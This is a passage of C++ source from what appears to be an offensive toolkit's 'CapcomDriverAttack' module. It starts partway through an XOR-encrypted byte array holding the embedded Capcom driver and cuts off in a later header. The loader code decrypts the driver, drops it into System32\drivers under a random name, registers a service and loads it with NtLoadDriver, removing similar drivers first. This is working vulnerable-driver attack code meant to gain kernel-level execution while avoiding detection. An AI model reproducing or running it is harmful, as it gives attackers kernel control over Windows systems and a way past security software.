	0x6, 0xe2, 0x6, 0x3f, 0xd8, 0x57, 0xfb, 0x1d, 0xe0, 0x58, 0x16, 0xde, 0xc, 0x2, 0x69, 0x9, 0xd5, 0x69, 0xe, 0x16, 0x35, 0x4e, 0x10, 0x14, 0x12, 0xdf, 0x4d, 0x3f, 0x97, 0x73, 0xd1, 0xfb, 0xff, 0xfe, 0xa2, 0x29, 0x96, 0xc6, 0xfb, 0xc3,
	0x71, 0x3b, 0xf6, 0x1c, 0x4e, 0xc8, 0xb0, 0x25, 0x6d, 0x37, 0xe6, 0xab, 0x6, 0x6f, 0x81, 0xa5, 0x6a, 0xde, 0x8b, 0x61, 0x29, 0x1c, 0xa5, 0x5f, 0xc9, 0x9c, 0xad, 0x27, 0x77, 0x4c, 0xec, 0x7f, 0x36, 0x33, 0xa1, 0x22, 0x85, 0x91, 0x1, 0xf6,
	0xea, 0x9c, 0x7, 0xdd, 0x7d, 0x91, 0x5a, 0xd1, 0xe8, 0x2d, 0xbf, 0xdd, 0xd6, 0x65, 0x74, 0x68, 0xc, 0xb1, 0xa, 0xc7, 0xf7, 0xe0, 0xe1, 0xe3, 0xe2, 0xe3, 0x41, 0x63, 0x29, 0xd2, 0x63, 0x2a, 0xd2, 0xf3, 0xe4, 0xe1, 0xb7, 0xff, 0xc2, 0xe6,
	0xe8, 0xd2, 0xea, 0xd2, 0xe4, 0xe4, 0xe6, 0xb7, 0xff, 0xc2, 0xe2, 0xd2, 0xed, 0xe4, 0xe1, 0xb7, 0xff, 0xf1, 0xe3, 0xe3, 0x1d, 0xe6, 0xe7, 0xd2, 0xe1, 0xe3, 0xe3, 0x1d, 0xd2, 0xe9, 0xe4, 0xe1, 0xb7, 0xff, 0xed, 0xe6, 0xe6, 0xe1, 0xe0, 0xe3,
	0x64, 0xd2, 0xff, 0xe4, 0xe1, 0xb7, 0xff, 0xec, 0xe6, 0xf4, 0xe6, 0xf6, 0x9d, 0x31, 0x87, 0x45, 0x20, 0x3f, 0xe, 0x59, 0x12, 0xd2, 0xeb, 0x11, 0xa1, 0xdb, 0x18, 0xe0, 0x4d, 0xd1, 0xd3, 0xd1, 0xd2, 0xfd, 0xe4, 0xe1, 0xb7, 0xff, 0xc1, 0xe6,
	0xfa, 0xd2, 0xf4, 0x62, 0xf6, 0x80, 0x19, 0xe8, 0xc3, 0xb9, 0x9d, 0xa1, 0x8c, 0xf3, 0x38, 0xeb, 0xb6, 0xb2, 0x89, 0x17, 0x30, 0x74, 0x93, 0x13, 0x7c, 0xd2, 0xb7, 0xe4, 0xe1, 0xb7, 0xff, 0xfd, 0xe6, 0xac, 0xd2, 0xae, 0xd2, 0xa8, 0x42, 0xaa,
	0x42, 0xa4, 0x64, 0xa6, 0x8a, 0x96, 0x96, 0x92, 0xd8, 0xcd, 0xcd, 0x81, 0x90, 0x8e, 0xcc, 0x8f, 0x8b, 0x81, 0x90, 0x8d, 0x91, 0x8d, 0x84, 0x96, 0xcc, 0x81, 0x8d, 0x8f, 0xcd, 0x92, 0x89, 0x8b, 0xcd, 0x81, 0x90, 0x8e, 0xcd, 0x92, 0x90, 0x8d,
	0x86, 0x97, 0x81, 0x96, 0x91, 0xcd, 0xaf, 0x8b, 0x81, 0x90, 0x8d, 0x91, 0x8d, 0x84, 0x96, 0xa1, 0x8d, 0x86, 0x87, 0xb4, 0x87, 0x90, 0x8b, 0x84, 0xb0, 0x8d, 0x8d, 0x96, 0xcc, 0x81, 0x90, 0x8e, 0xd2, 0xef, 0xe4, 0xeb, 0xc8, 0x64, 0xaa, 0x64,
	0x15, 0xef, 0xe3, 0xe3, 0xe7, 0xe7, 0xe2, 0xe1, 0x60, 0xe0, 0xe3, 0xe2, 0x63, 0xc8, 0x60, 0xf4, 0x6e, 0xd6, 0x85, 0xc9, 0x7, 0xe1, 0x9, 0xd6, 0x99, 0x6e, 0x40, 0x41, 0xb2, 0x68, 0x16, 0xb7, 0x64, 0x13, 0xfc, 0x6e, 0x6c, 0x4c, 0x9f, 0xc,
	0xe1, 0xfb, 0x2c, 0x90, 0x77, 0xfa, 0xaa, 0x4f, 0x80, 0xf3, 0x1f, 0xc2, 0x1f, 0xdd, 0xa5, 0xe4, 0xe3, 0xb8, 0x0, 0x2, 0x8d, 0x6e, 0xf7, 0xce, 0xac, 0xde, 0x88, 0xb2, 0x8e, 0xe9, 0xd4, 0x41, 0x2d, 0x98, 0xef, 0x7e, 0xa0, 0x5e, 0xbe, 0x1a,
	0xfb, 0x37, 0x82, 0x1, 0x8b, 0x4, 0x0, 0xc1, 0xa3, 0x85, 0x6e, 0x8a, 0x61, 0x94, 0xc9, 0x6d, 0x71, 0x41, 0xc8, 0x57, 0x9d, 0x5c, 0xbb, 0x19, 0x4b, 0x2b, 0x50, 0xc4, 0x6d, 0x28, 0x40, 0x11, 0x60, 0xf9, 0x7a, 0xdc, 0x73, 0x77, 0xc5, 0x75,
	0x64, 0x83, 0xc, 0xb9, 0xbf, 0xe5, 0x89, 0x2f, 0x64, 0x4a, 0x0, 0x87, 0x62, 0x4a, 0x0, 0xf7, 0x0, 0x50, 0x5c, 0xc1, 0xe7, 0x88, 0x58, 0xee, 0x11, 0xa5, 0x71, 0xaf, 0x4e, 0x46, 0x6e, 0xe5, 0x9b, 0xdb, 0x22, 0x83, 0xf0, 0xd8, 0xe7, 0xef,
	0x6b, 0x41, 0xe, 0x7d, 0xb5, 0x6b, 0x66, 0x19, 0xe, 0x28, 0x9e, 0xa5, 0x84, 0xf6, 0x73, 0x3a, 0x54, 0xed, 0xfb, 0xbf, 0x4, 0x5a, 0xa8, 0x4e, 0x5e, 0xa5, 0x2a, 0x93, 0xa1, 0x74, 0x4, 0xd0, 0xc2, 0x47, 0x3e, 0x95, 0x64, 0x1f, 0xde, 0x1,
	0x69, 0x93, 0x39, 0x99, 0x79, 0xe1, 0x1e, 0x55, 0xff, 0xd0, 0x86, 0x9, 0xf4, 0xb0, 0x42, 0xa1, 0x41, 0x18, 0xcc, 0x4f, 0xbb, 0x70, 0xac, 0x9e, 0x25, 0x10, 0xd1, 0xa0, 0xaa, 0xda, 0xb3, 0xd8, 0x9e, 0xda, 0x25, 0xf9, 0xc6, 0xc0, 0xca, 0xa2,
	0xfc, 0xf8, 0xa4, 0xfd, 0xf5, 0x39, 0xfa, 0x15, 0x12, 0xc5, 0xd7, 0x8e, 0x5a, 0x81, 0x3b, 0x2f, 0x5b, 0x86, 0xbf, 0xc9, 0x47, 0xbc, 0xd, 0x24, 0xcb, 0x56, 0x10, 0x25, 0x1a, 0xc3, 0x2e, 0xe6, 0x58, 0xb5, 0x1f, 0xe3, 0x54, 0x49, 0x24, 0x85,
	0x1b, 0x5, 0x31, 0x7b, 0x9d, 0x16, 0x17, 0xc0, 0x18, 0x90, 0x17, 0x1f, 0x1d, 0xd8, 0xfe, 0xa0, 0xd8, 0x43, 0x1b, 0x62, 0xfa, 0x47, 0xc, 0x6f, 0xfe, 0x36, 0x84, 0x7c, 0xa7, 0xe3, 0x1c, 0x48, 0xc, 0x1d, 0x19, 0xf5, 0x6d, 0xd2, 0x15, 0x13,
	0x2f, 0xcb, 0x27, 0x7f, 0xe, 0x57, 0x37, 0xab, 0xe2, 0xdf, 0x67, 0x5a, 0x29, 0x59, 0x71, 0xd8, 0xc5, 0x88, 0xab, 0x22, 0xd2, 0x4c, 0x84, 0x2b, 0x15, 0xc1, 0xca, 0xd0, 0x94, 0x1b, 0x46, 0x61, 0xb4, 0x2a, 0xaa, 0x2c, 0xb8, 0x74, 0x48, 0x42,
	0x2e, 0xee, 0x26, 0x9d, 0x56, 0x6c, 0x75, 0x4d, 0x8f, 0x1, 0xb6, 0xc5, 0x21, 0x7d, 0x64, 0x22, 0x34, 0x6, 0x91, 0xea, 0x75, 0xe7, 0x39, 0x32, 0xb6, 0x80, 0xbc, 0xe1, 0xaa, 0x20, 0x37, 0x7d, 0x9d, 0x45, 0x84, 0x6e, 0x32, 0x7f, 0x52, 0xad,
	0x36, 0x31, 0x7a, 0xbd, 0xa9, 0x98, 0x2b, 0x9d, 0x50, 0xcb, 0xb0, 0x32, 0xf0, 0x62, 0x25, 0xed, 0xb6, 0x54, 0xfc, 0x85, 0x2f, 0x24, 0x42, 0x8e, 0xf3, 0xe1, 0x66, 0x31, 0xaa, 0x97, 0x5, 0xc8, 0x1c, 0x52, 0xd9, 0x8c, 0xe8, 0xd8, 0x44, 0x89,
	0x94, 0x7b, 0xe7, 0x41, 0x13, 0x95, 0x8a, 0x83, 0xd1, 0xf6, 0xa5, 0xe4, 0x1e, 0xb1, 0x9d, 0xb0, 0x5f, 0x70, 0xf6, 0xbe, 0xa8, 0xc6, 0x88, 0x85, 0x6e, 0x4d, 0x6f, 0x72, 0x48, 0x32, 0x14, 0x9b, 0xc3, 0xf9, 0x71, 0xc4, 0x9e, 0x21, 0x2c, 0xfc,
	0x5f, 0x6a, 0xda, 0x70, 0x4c, 0xa7, 0x24, 0xfb, 0x88, 0xab, 0xb2, 0x51, 0xe7, 0x1a, 0x4c, 0xbb, 0xd5, 0x68, 0x88, 0xc7, 0xe1, 0x76, 0x53, 0xbb, 0x63, 0xb2, 0xa, 0x58, 0x61, 0x62, 0x55, 0xc1, 0xd7, 0x16, 0x94, 0x5b, 0x85, 0xff, 0xbb, 0xfa,
	0x4f, 0xc2, 0x6f, 0x76, 0xd3, 0x60, 0xe6, 0xde, 0xd2, 0x60, 0xe6, 0xda, 0xe0, 0xe3, 0xe3, 0xd2, 0x63, 0x71, 0xd2, 0x9d, 0xd3, 0xe9, 0xd2, 0xeb, 0xe4, 0xe1, 0xb7, 0xe6, 0xe4, 0xf1, 0xe0, 0xb7, 0xb1, 0xd3, 0xff, 0xd2, 0xf9, 0xe4, 0xe1, 0xb7,
	0xe6, 0xe8, 0xf1, 0xf6, 0xb1, 0x9b, 0x8f, 0x83, 0x8c, 0x96, 0x87, 0x81, 0xc2, 0xa1, 0x8d, 0x90, 0x92, 0x8d, 0x90, 0x83, 0x96, 0x8b, 0x8d, 0x8c, 0xd3, 0xfd, 0xd2, 0xff, 0xe4, 0xe1, 0xb7, 0xe6, 0xe9, 0xf1, 0xf4, 0xb1, 0x9b, 0x8f, 0x83, 0x8c,
	0x96, 0x87, 0x81, 0xc2, 0xb6, 0x90, 0x97, 0x91, 0x96, 0xc2, 0xac, 0x87, 0x96, 0x95, 0x8d, 0x90, 0x89, 0xd3, 0xd2, 0xd2, 0xcc, 0xe4, 0xe1, 0xb7, 0xe6, 0xe1, 0xf1, 0xc5, 0xb1, 0x9b, 0x8f, 0x83, 0x8c, 0x96, 0x87, 0x81, 0xc2, 0xa1, 0x8e, 0x83,
	0x91, 0x91, 0xc2, 0xd1, 0xc2, 0xb1, 0xaa, 0xa3, 0xd0, 0xd7, 0xd4, 0xc2, 0xa1, 0x8d, 0x86, 0x87, 0xc2, 0xb1, 0x8b, 0x85, 0x8c, 0x8b, 0x8c, 0x85, 0xc2, 0xa1, 0xa3, 0xe0, 0xf2, 0x9c, 0xbb, 0xa2, 0x6f, 0xde, 0x7b, 0x27, 0xf3, 0x4a, 0xb1, 0x19,
	0xcd, 0x91, 0x22, 0xdf, 0x26, 0xd2, 0xeb, 0xe4, 0xe7, 0xc9, 0xec, 0xe1, 0xe0, 0xf8, 0xe7, 0xe2, 0x42, 0x92, 0xd2, 0xf2, 0xe4, 0xe8, 0xc9, 0xe4, 0xe3, 0xe6, 0xe3, 0x60, 0xd5, 0xe0, 0xe3, 0xee, 0xd3, 0xe0, 0xd2, 0xe2, 0xd2, 0xfb, 0xe4, 0xeb,
	0xc8, 0x64, 0xaa, 0x64, 0x15, 0xef, 0xe3, 0xeb, 0xe1, 0xd3, 0xee, 0xe4, 0xe8, 0xc9, 0xe4, 0xe3, 0xe6, 0xe3, 0x60, 0xd5, 0xe0, 0xe3, 0xe6, 0xd2, 0xfe, 0xe4, 0xe8, 0xc9, 0xe4, 0xe3, 0xe6, 0xe3, 0x60, 0xd5, 0xe0, 0xe3, 0xe9, 0xd3, 0xec, 0xd2,
	0xee, 0xe4, 0xe8, 0xc9, 0xe4, 0xe3, 0xe6, 0xe3, 0x60, 0xd5, 0xe0, 0xe3, 0xf7, 0xd2, 0xc1, 0xe4, 0xeb, 0xc8, 0x64, 0xaa, 0x64, 0x15, 0xef, 0xe3, 0xeb, 0xe6, 0xd3, 0xf4, 0xe6, 0xf6, 0x55, 0xf, 0x63, 0x9c, 0x40, 0xd4, 0xc8, 0xe7, 0xf1, 0xff,
	0x6e, 0xdb, 0x9, 0x3a, 0xc4, 0xac, 0x5b, 0x4e, 0x0, 0xdc, 0xd2, 0xef, 0xe4, 0xeb, 0xc8, 0x64, 0xaa, 0x64, 0x15, 0xef, 0xe3, 0xe3, 0xe3, 0xe7, 0xe2, 0xe6, 0x60, 0xe3, 0xe2, 0xd7, 0x3b, 0x2b, 0x53, 0xb5, 0xcf, 0x59, 0xf4, 0x5a, 0xc2, 0x3,
	0x2f, 0xcd, 0xa, 0x51, 0xa6, 0xff, 0x15, 0x8b, 0x3d, 0xa6, 0x5b, 0x90, 0x43, 0xd5, 0x44, 0x28, 0x14, 0xff, 0x8a, 0xc0, 0x38, 0x17, 0x1f, 0xfb, 0xf2, 0x98, 0x83, 0x48, 0x6b, 0x6b, 0xbe, 0xe0, 0x3e, 0x1f, 0xde, 0xa6, 0xac, 0x31, 0x44, 0x10,
	0xe0, 0xaa, 0x2b, 0xbc, 0xe6, 0x6b, 0xcb, 0xe2, 0xdf, 0xbe, 0xde, 0x50, 0xa2, 0x78, 0x55, 0x96, 0xf5, 0xb4, 0xc7, 0x93, 0x84, 0x82, 0x4e, 0xcc, 0xd8, 0xd9, 0xd0, 0x3f, 0xd5, 0x5e, 0xa5, 0x9e, 0xda, 0x73, 0xb4, 0x98, 0x5e, 0x23, 0x4a, 0x2a,
	0xde, 0x7c, 0xbb, 0x85, 0xb9, 0x72, 0xe3, 0x8d, 0x20, 0x76, 0xb0, 0x44, 0xa, 0x50, 0xa7, 0x65, 0xf, 0xde, 0x74, 0x2, 0x98, 0xd, 0x77, 0x4b, 0x52, 0xf9, 0x45, 0x17, 0xbc, 0xaa, 0xf5, 0xb0, 0xc8, 0x39, 0x90, 0xcd, 0xbb, 0xe5, 0x10, 0x32,
	0x4, 0x47, 0x77, 0xe0, 0x5b, 0x83, 0xa8, 0x7f, 0xa6, 0x38, 0xe8, 0x2f, 0x10, 0x41, 0x1f, 0xbc, 0xd6, 0xc1, 0x3b, 0x5c, 0x1a, 0xc6, 0xce, 0xeb, 0xa9, 0x5e, 0xad, 0xfa, 0xa5, 0x3e, 0xc5, 0x42, 0x4d, 0xab, 0xf7, 0x20, 0x5a, 0xff, 0xe0, 0x9b,
	0xf9, 0xb9, 0xa6, 0xb3, 0x62, 0x9, 0x83, 0xc4, 0x28, 0xba, 0x6e, 0x4, 0x2c, 0xb4, 0x94, 0xc3, 0xb4, 0xd7, 0xd8, 0x37, 0x75, 0x7, 0x3a, 0xdb, 0x1f, 0xf, 0x58, 0x1b, 0x3b, 0x32, 0x98, 0xb2, 0x89, 0x3d, 0xed, 0x8b, 0x43, 0x8d, 0x30, 0xa,
	0x4b, 0xfe, 0xf4, 0x84, 0xa2, 0xbc, 0x5d, 0xf9, 0xc8, 0xf5, 0x9, 0x2f, 0xe5, 0xc3, 0x77, 0x8e, 0x1e, 0x6c, 0x8d, 0x36, 0x5f, 0x79, 0x68, 0xba, 0xac, 0xac, 0xa9, 0x5d, 0x5, 0xb4, 0xec, 0x8e, 0x95, 0x5d, 0xe4, 0x14, 0x60, 0x6e, 0x7, 0xa2,
	0x2d, 0xef, 0x5b, 0xbf, 0x7d, 0x43, 0x60, 0xe0, 0xe9, 0xd2, 0x60, 0xe0, 0xe5, 0xe4, 0xeb, 0xc8, 0x64, 0xaa, 0x64, 0x15, 0xef, 0xe3, 0xeb, 0xe4, 0xd3, 0x60, 0xe3, 0x1a, 0xd2, 0x60, 0xe3, 0x16, 0xe0, 0xe3, 0xe3, 0xd2, 0x90, 0xd2, 0xbc, 0xd3,
	0xe9, 0xd2, 0xeb, 0xe4, 0xe1, 0xb7, 0xe6, 0xe4, 0xf1, 0xe0, 0xb7, 0xb1, 0xd3, 0xff, 0xd2, 0xf9, 0xe4, 0xe1, 0xb7, 0xe6, 0xe8, 0xf1, 0xf6, 0xb1, 0x9b, 0x8f, 0x83, 0x8c, 0x96, 0x87, 0x81, 0xc2, 0xa1, 0x8d, 0x90, 0x92, 0x8d, 0x90, 0x83, 0x96,
	0x8b, 0x8d, 0x8c, 0xd3, 0xd2, 0xd2, 0xcc, 0xe4, 0xe1, 0xb7, 0xe6, 0xe1, 0xf1, 0xc5, 0xb1, 0x9b, 0x8f, 0x83, 0x8c, 0x96, 0x87, 0x81, 0xc2, 0xb6, 0x8b, 0x8f, 0x87, 0xc2, 0xb1, 0x96, 0x83, 0x8f, 0x92, 0x8b, 0x8c, 0x85, 0xc2, 0xb1, 0x87, 0x90,
	0x94, 0x8b, 0x81, 0x87, 0x91, 0xc2, 0xa1, 0xa3, 0xc2, 0xcf, 0xc2, 0xa5, 0xd0, 0xe0, 0xf2, 0xec, 0x2d, 0x16, 0xda, 0x2a, 0x1c, 0x5d, 0xd7, 0x8c, 0xe6, 0x3a, 0x88, 0x7a, 0xf9, 0xf8, 0xb2, 0xd2, 0xeb, 0xe4, 0xe7, 0xc9, 0xec, 0xe1, 0xe0, 0xf8,
	0xe7, 0xe2, 0x42, 0xbf, 0xd2, 0xfa, 0xe4, 0xeb, 0xc8, 0x64, 0xaa, 0x64, 0x15, 0xef, 0xe3, 0xeb, 0xe1, 0xd3, 0xe9, 0xe4, 0xeb, 0xc8, 0x64, 0xaa, 0x64, 0x15, 0xef, 0xe3, 0xe5, 0xe3, 0xd2, 0xfe, 0xe4, 0xeb, 0xc8, 0x64, 0xaa, 0x64, 0x15, 0xef,
	0xe3, 0xeb, 0xe7, 0xd3, 0xed, 0xf5, 0xef, 0xd3, 0xd4, 0xd2, 0xdb, 0xd2, 0xd4, 0xd2, 0xd7, 0xd2, 0xd1, 0xd0, 0xd3, 0xb8, 0xd2, 0xc1, 0xe4, 0xeb, 0xc8, 0x64, 0xaa, 0x64, 0x15, 0xef, 0xe3, 0xeb, 0xe6, 0xd3, 0xf4, 0xe6, 0xf6, 0xaf, 0x33, 0x5f,
	0x6e, 0xb, 0xb0, 0xec, 0x50, 0x74, 0xec, 0x83, 0x77, 0x2c, 0x80, 0xd, 0xc4, 0x2b, 0x31, 0xf6, 0x1f, 0xd2, 0xef, 0xe4, 0xeb, 0xc8, 0x64, 0xaa, 0x64, 0x15, 0xef, 0xe3, 0xe3, 0xe3, 0xe7, 0xe2, 0xe6, 0x60, 0xe3, 0xe2, 0xaa, 0xc4, 0xd9, 0x6,
	0x39, 0x9a, 0x9e, 0x4f, 0x75, 0x93, 0xbe, 0x7e, 0xf6, 0xf2, 0x11, 0x5c, 0xbc, 0xff, 0xf9, 0x5d, 0x9f, 0xb9, 0x17, 0xd7, 0x85, 0xc4, 0x67, 0x85, 0x39, 0xaa, 0x1e, 0x45, 0x59, 0x3c, 0xd9, 0xc3, 0x70, 0x69, 0xd7, 0xd, 0x40, 0x85, 0x81, 0x91,
	0x96, 0x18, 0x1d, 0x93, 0x59, 0x53, 0xfb, 0x31, 0x2d, 0x81, 0x35, 0x63, 0x66, 0x7f, 0xa4, 0xde, 0x52, 0xd, 0x76, 0x86, 0xc3, 0x69, 0xe9, 0x3c, 0x85, 0xa9, 0xac, 0x6d, 0xa9, 0x0, 0x18, 0xec, 0xc8, 0xb5, 0xcd, 0x3e, 0x69, 0x30, 0x5d, 0xde,
	0x9b, 0x25, 0x4e, 0x69, 0x5a, 0x9a, 0xb0, 0x29, 0x29, 0xa0, 0x46, 0xbe, 0xc7, 0xf3, 0x12, 0x90, 0x0, 0x53, 0x2a, 0x74, 0x63, 0x89, 0x1d, 0x8d, 0xcd, 0x81, 0x5d, 0xde, 0xae, 0x2a, 0xae, 0x50, 0x42, 0xb7, 0x4c, 0x5, 0x7a, 0xb0, 0x94, 0xf,
	0x1d, 0x66, 0xc9, 0xe0, 0xc4, 0x66, 0xb7, 0x35, 0x8c, 0x68, 0x88, 0xe3, 0xfa, 0x38, 0x6, 0x9b, 0x25, 0x25, 0x5a, 0xdd, 0x98, 0xd0, 0x15, 0x8b, 0x8e, 0x4, 0xe2, 0xbc, 0x70, 0x62, 0xae, 0xa2, 0xed, 0x8f, 0x71, 0x58, 0x2b, 0xc1, 0xca, 0x33,
	0x92, 0x70, 0xf3, 0x7d, 0xbd, 0x55, 0xf6, 0xc0, 0x3e, 0x6, 0xf7, 0x80, 0x58, 0x5, 0x91, 0x9c, 0xa2, 0xd6, 0x5e, 0x46, 0x59, 0xab, 0x9c, 0x8d, 0x3e, 0x46, 0xcc, 0xc1, 0xa3, 0xa5, 0x2, 0xa, 0xf8, 0x82, 0x3a, 0xd2, 0x6e, 0xaf, 0x5c, 0x7f,
	0xa1, 0xd0, 0x59, 0x44, 0x83, 0xf3, 0x44, 0x38, 0xaf, 0xc1, 0x11, 0x4b, 0x37, 0xf8, 0xc7, 0x64, 0x4e, 0x25, 0x7, 0x52, 0x9b, 0x23, 0x1d, 0xd5, 0x2c, 0xbb, 0x7f, 0xe0, 0xaa, 0x3a, 0xe, 0x9, 0x75, 0x3e, 0xfb, 0x40, 0xb9, 0x3e, 0x30, 0xe6,
	0x29, 0x93, 0x5f, 0xbc, 0x6c, 0xe2, 0x79, 0x87, 0x97, 0x95, 0x8c, 0x6a, 0xe2, 0xe2, 0xe2, 0xe2,
};
static const unsigned char CAPCOM_DRIVER_XOR_KEY = 0xe2;
```

`AttackServices/CapcomDriverAttack/CapcomLoader.h`:

```h
#pragma once
#include <windows.h>
#include <Shlwapi.h>
// #include <Subauth.h>
#include <string>
#include <filesystem>
#include <fstream>
#include <iostream>
#include "CapcomDriver.h"
#include "NtDefines.h"
#include "CapcomLoader.h"

#define STATUS_SUCCESS 0

using namespace std;

static wstring globalCapcomDriverName;

void DecryptDriver() {
	if (CAPCOM_DRIVER[0] != 0x4D) {
		for (BYTE& b : CAPCOM_DRIVER) {
            b ^= CAPCOM_DRIVER_XOR_KEY;
        }
	}
}

wstring CreateDriverName() {
    srand(__rdtsc());
    wstring driverName = L"";
    for (int i = 0; i < 12; i++) {
        driverName += wchar_t(L'A' + rand() % 20);
    }
    return driverName;
    // return L"capcom";
}

wstring GetDriverPath() {
	wchar_t systemDirectory[2048];
	GetSystemDirectoryW(systemDirectory, 2048);

	wstring driverPath = systemDirectory;
	driverPath += L"\\drivers\\";

	return driverPath;
}

BOOL CreateDriverFile(const wchar_t* capcomDriverName) {
    wstring driverPath = GetDriverPath() + capcomDriverName + L".sys";
    ofstream driverFile(driverPath, ios::binary);
	if (!driverFile.good()) {
		cout << "Failed to create driver file!" << endl;
		return FALSE;
    }
    driverFile.write((char*)CAPCOM_DRIVER, sizeof(CAPCOM_DRIVER));
    driverFile.close();
    return TRUE;
}

NTSTATUS RemoveDriverFromRegistry(const wchar_t* driverName) {
	NTSTATUS status = STATUS_SUCCESS;

	wstring RegistryPath = wstring(L"System\\CurrentControlSet\\Services\\") + driverName;

	status = RegDeleteKeyW(HKEY_LOCAL_MACHINE, RegistryPath.c_str());
	if (!status || status == ERROR_FILE_NOT_FOUND) {
        return STATUS_SUCCESS;
    }

	status = SHDeleteKeyW(HKEY_LOCAL_MACHINE, RegistryPath.c_str());
	if (!status || status == ERROR_FILE_NOT_FOUND) {
        return STATUS_SUCCESS;
    }

	status = RegDeleteKeyW(HKEY_LOCAL_MACHINE, RegistryPath.c_str());
	if (!status || status == ERROR_FILE_NOT_FOUND) {
        return STATUS_SUCCESS;
    }

	return status;
}

NTSTATUS AddServiceToRegistry(const wchar_t* driverName) {
    NTSTATUS status = STATUS_SUCCESS;

    wstring registryPath = wstring(L"System\\CurrentControlSet\\Services\\") + driverName;

    RemoveDriverFromRegistry(driverName);

    HKEY key;
    status = RegCreateKeyExW(HKEY_LOCAL_MACHINE, registryPath.c_str(), 0, NULL, 0, KEY_ALL_ACCESS, NULL, &key, 0);

    if (status != ERROR_SUCCESS) {
        return status;
    }
    wstring driverPath = wstring(L"\\SystemRoot\\System32\\drivers\\") + driverName + L".sys";
    DWORD value = 1;
    status |= RegSetValueExW(key, L"ImagePath", 0, REG_EXPAND_SZ, (PBYTE)driverPath.c_str(), driverPath.size() * sizeof(wchar_t));
    status |= RegSetValueExW(key, L"Type", 0, REG_DWORD, (PBYTE)&value, sizeof(DWORD));
    status |= RegSetValueExW(key, L"ErrorControl", 0, REG_DWORD, (PBYTE)&value, sizeof(DWORD));
    value = 3;
    status |= RegSetValueExW(key, L"Start", 0, REG_DWORD, (PBYTE)&value, sizeof(DWORD));

    if (status != ERROR_SUCCESS) {
        RegCloseKey(key);
        RemoveDriverFromRegistry(driverName);
        return status;
    }

    RegCloseKey(key);
    return STATUS_SUCCESS;
}

NTSTATUS TryOpenServiceKey(const wchar_t* driverName) {
	wstring registryPath = wstring(L"System\\CurrentControlSet\\Services\\") + driverName;
	HKEY key;
	NTSTATUS result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, registryPath.c_str(), 0, KEY_ALL_ACCESS, &key);
	RegCloseKey(key);
	return result;
}

NTSTATUS UnloadDriver(const wchar_t* driverName) {
	BOOLEAN alreadyEnabled = FALSE;
    if (RtlAdjustPrivilege(SeLoadDriverPrivilege, 1ull, AdjustCurrentProcess, &alreadyEnabled) != STATUS_SUCCESS && !alreadyEnabled) {
        return FALSE;
    }

	if (TryOpenServiceKey(driverName) == 2) {
        AddServiceToRegistry(driverName);
    }
		
	wstring sourceRegistry = wstring(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\") + driverName;

	UNICODE_STRING sourceRegistryUnicode = {0};
	sourceRegistryUnicode.Buffer = (wchar_t*) sourceRegistry.c_str();
	sourceRegistryUnicode.Length = (sourceRegistry.size()) * 2;
	sourceRegistryUnicode.MaximumLength = (sourceRegistry.size() + 1) * 2;

	NTSTATUS status;
	status = NtUnloadDriver(&sourceRegistryUnicode);

	// printf("NtUnloadDriver(%ls) returned %08x\n", sourceRegistry.c_str(), status);

	RemoveDriverFromRegistry(driverName);

	return status;

}

NTSTATUS RemoveSimilarDrivers(BYTE* driver) {
	namespace fs = experimental::filesystem;

	wstring driverPath = GetDriverPath();

	NTSTATUS status = STATUS_SUCCESS;

	for (auto& file : fs::directory_iterator(driverPath)) {
		wstring path = file.path();
		if (path.find(L".sys") != -1) {
			ifstream fileStr(path, ios::binary);
			char data[1024];
			fileStr.read(data, 1024);
			fileStr.close();

			if (!memcmp(driver, data, 1024)) {
				bool deleted = DeleteFileW(path.c_str());

				// printf("DeleteFile (%ls) : %x\n", path.c_str(), deleted);

				if (!deleted) {
					int strEnd = path.find(L".sys");
					int strStart = path.rfind(L"\\", strEnd);
					wstring driverName = path.substr(strStart + 1, strEnd - strStart - 1).c_str();
					UnloadDriver(driverName.c_str());

					deleted = DeleteFileW(path.c_str());
					// printf("DeleteFile2 (%ls) : %x\n", path.c_str(), deleted);
				}

				status |= !deleted;
			}
		}
	}

	return status;
}


BOOL LoadDriver() {

    DecryptDriver();

    if (RemoveSimilarDrivers(CAPCOM_DRIVER) != STATUS_SUCCESS) {
		printf("Failed to remove similar drivers!\n");
		return FALSE;
	}
    
    wstring driverName = CreateDriverName();
	globalCapcomDriverName = driverName;
    
    if (!CreateDriverFile(driverName.c_str())) {
		cout << "LoadDriver::CreateDriverFile failed" << endl;
        return FALSE;
    }

    BOOLEAN alreadyEnabled = FALSE;
    if (RtlAdjustPrivilege(SeLoadDriverPrivilege, 1ull, AdjustCurrentProcess, &alreadyEnabled) != STATUS_SUCCESS && !alreadyEnabled) {
		cout << "LoadDriver::RtlAdjustPrivilege failed" << endl;
        return FALSE;
    }
    
    if (AddServiceToRegistry(driverName.c_str()) != STATUS_SUCCESS) {
		cout << "LoadDriver::AddServiceToRegistry failed" << endl;
        return FALSE;
    }
    
    wstring sourceRegistry = wstring(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\") + driverName;

    UNICODE_STRING sourceRegistryUnicode = {0};
    sourceRegistryUnicode.Buffer = (wchar_t*) sourceRegistry.c_str();
    sourceRegistryUnicode.Length = (sourceRegistry.size()) * 2;
    sourceRegistryUnicode.MaximumLength = (sourceRegistry.size() + 1) * 2;

    NTSTATUS status = NtLoadDriver(&sourceRegistryUnicode);

    // printf("NtLoadDriver(%ls) returned %08x\n", sourceRegistry.c_str(), status);

    if (status != STATUS_SUCCESS) {
        UnloadDriver(driverName.c_str());
        RemoveDriverFromRegistry(driverName.c_str());
        return FALSE;
    }
    return TRUE;
}

HANDLE OpenDevice(string driverName) {
	char completeDeviceName[128];
	sprintf_s(completeDeviceName, "\\\\.\\%s", driverName.data());

	HANDLE deviceHandle = CreateFileA(
		completeDeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (deviceHandle == INVALID_HANDLE_VALUE) {
        deviceHandle = 0;
    }
	// printf("[+] CreateFileA(%s) returned %p\n", completeDeviceName, deviceHandle);
	return deviceHandle;
}
```

`AttackServices/CapcomDriverAttack/CapcomLockMemory.h`:

```h
#pragma once
#include <Windows.h>
#include <iostream>

#pragma warning(disable : 4330)
#pragma section(".LDATA", read, write)
#pragma section(".LTEXT", read, write, execute)

#pragma data_seg(".LDATA$1")
#pragma data_seg(".LDATA$2")
#pragma data_seg(".LDATA$3")
#pragma data_seg()

#pragma code_seg(".LTEXT$1")
